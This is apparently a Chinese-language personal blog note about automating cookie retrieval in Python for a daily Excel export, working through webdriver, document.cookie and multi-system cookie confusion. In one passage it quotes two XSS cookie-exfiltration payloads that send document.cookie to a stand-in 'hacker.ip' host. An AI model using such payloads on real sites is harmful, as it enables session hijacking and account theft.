login.py用来获取登录的cookie，且对cookie进行拼接处理  
download.py调用login.py的方法，并携带cookie请求excel导出接口  

遇到了一个需求，导出每一天的excel，需要手动点击很麻烦  

而且请求包有一大串Cookies(cookie1+cookie2+cookie3)，才能正确请求，不想手动复制浏览器的Cookies，想自动获取cookies如何操作，最好是傻瓜式操作  

过程：  
当我利用登录后的cookies，只有cookie1，传递过去，很明显请求失败

经过浏览器搜索发现，后面的cookie2和cookie3貌似是js动态生成的
此外，python一般代码获取的cookie，仅仅是响应包的set-cookie

在浏览器中的控制台中输入document.cookie，可以看到所有的cookies
貌似都离不开打开浏览器本身这条路了

问了问我的好兄弟，他说用Selenium，webdriver(调试浏览器用的)去启动chromedriver，那还要下载对应版本的driver，但这里的浏览器又是高版本的，emmmm  

我当时还喜滋滋地认为用xss反弹不就好啦，写一个本地的html文件，webbrowser打开这个html文件，不就弹出来啦  
一试，空的，嘶  

嘶，访问的是哪个站，就显示哪个站的cookie，所以依靠xss貌似行不通了(怪不得xss要写进源网页)  
这样的话，我script跳转到目标页面之后，后面弹窗语句就不管用了  

这个就牵扯到跨域了，<scrpit>这些标签可以跨域，emmm  
这个时候就想一想传统的xss钓鱼怎么搞的了，反弹cookie  
总之有一条语句是<script>http://hacker.ip?id=document.cookie</script>  
或者<img src=x onerror=this.src="http://hacker.ip?id="+document.cookie>  

但是啊，以受害者的角度讲，他再怎样触发，也是从一个旧tab页面中得到的，而不是一个新tab页面；除非我把这个能写进目标站的源代码里面，否则得到的永远是空  

(怪不得xss要写进源网页)  
(怪不得xss要写进源网页)  
(怪不得xss要写进源网页╮(╯▽╰)╭)  

csrf的话，其实是登录进去过，知道里面的整个情况，从而诱导受害者提交一个修改好的表单，比如更改个人设置这些，是利用cookie，但不是获取cookie  

我想简单了，啧。   


而且document.cookie也不能无脑粘贴，目标网页只要自己的那3个字段，多了也请求失败   
那就在console中这样输出一下  
co=document.cookie.split(';');这是筛选出来每个cookie  
co1=co[0].split('=');这是筛选每一个cookie中的键，因为我需要通过键来匹配我需要的3个字段，匹配了，我再取对应的值

笑死了，最后我本来用webdriver，不舍得用chrome降版本，我就用webdriver.Edge()去打开，获取cookie时发现还是很短(这个其实也理解，因为document.cookie之所以多，是因为我打开的页面多)，所以最后我发现根本不需要那么多cookie  

我分析了一下，是因为我当时是访问了ip:x，登录后，又登录了ip:y，我在使用ip:y的某个功能时，发现请求包的Cookies很多，是因为包含了这两个系统的cookie，浏览器将它们视为同一域名下的系统，通过f12->应用程序->Cookie，很容易发现  
Domain那一列，是相同的ip，所以是这个原因，导致cookie很多  

我还以为是js动态生成cookie呢，6  

我这里的cookie之所以只有登录给的cookie还不起作用，是因为服务器自己还设置了一个cookie，是写死的标识符作用比如，asd=qweqw，额外添加上，最终python调用才会生效。

但是又出现一个问题，当cookie变成变量，被如下处理时，没效果
headers={
	'Cookie':cookie
}  
 'Cookie':'sessionid=xxx;adasd=asdas;'也突然不起作用了  
但都是一样的值啊，嘶  
那我大概知道了，这个登录的cookie和这个请求功能需要的cookie没用，换言之不匹配  
我应该是找错登录的请求包了  
所以我f12，应用程序，清空cookie时，提示我重新登录，果然，这个登录页面和我之前的登录页面有区别，可恶，应该是几个系统合成一块的  
故意输错账号密码，f12查看接口即可
